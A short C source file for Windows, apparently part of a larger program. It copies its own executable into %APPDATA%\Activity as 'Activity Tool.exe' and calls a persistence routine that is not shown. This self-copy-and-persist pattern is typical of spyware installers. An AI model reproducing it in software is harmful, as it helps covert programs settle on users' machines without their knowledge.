#include "engine.h"


void install_program() {
    char exePath[MAX_PATH];
    char appDataPath[MAX_PATH];
    char appDataDirPath[MAX_PATH];
    char appDataExePath[MAX_PATH];

    GetModuleFileName(NULL, exePath, MAX_PATH);
    SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, appDataPath);
    snprintf(appDataDirPath, sizeof(appDataDirPath), "%s\\Activity", appDataPath);
    snprintf(appDataExePath, sizeof(appDataExePath), "%s\\Activity Tool.exe", appDataDirPath);
    if (strstr(exePath, appDataDirPath) == exePath)
        return;

    CreateDirectory(appDataDirPath, NULL);
    CopyFile(exePath, appDataExePath, FALSE);
    install_persistence(appDataExePath);
}
